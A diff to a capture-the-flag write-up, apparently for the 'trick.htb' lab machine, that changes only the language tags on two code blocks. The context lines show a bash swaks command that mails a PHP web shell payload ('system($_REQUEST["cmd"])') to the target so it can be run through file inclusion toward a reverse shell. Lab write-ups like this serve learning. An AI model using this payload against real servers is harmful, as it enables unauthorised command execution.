@@ -97,7 +97,7 @@ Here's the decoded value for index.php
 ![image](https://user-images.githubusercontent.com/113513376/217156126-87334238-eb49-4a7c-b762-1bd6391a5883.png)
 ![image](https://user-images.githubusercontent.com/113513376/217156230-671d5a41-47cf-433a-97e5-e9ffd53476ba.png)
 
-```
+```php
 <?php
 	session_start();
   if(!isset($_SESSION['login_id']))
@@ -681,7 +681,7 @@ But when i access it on the web browser and append `&cmd=whoami` it worked but a
 
 So the best thing is to use a script which will do the email sending and navigate to the url with the reverse shell
 
-```
+```bash
 #!/bin/bash
 
 swaks --to michael --from lol --header 'Subject: Hello' --body '<?php system($_REQUEST["cmd"]); ?>' --server trick.htb
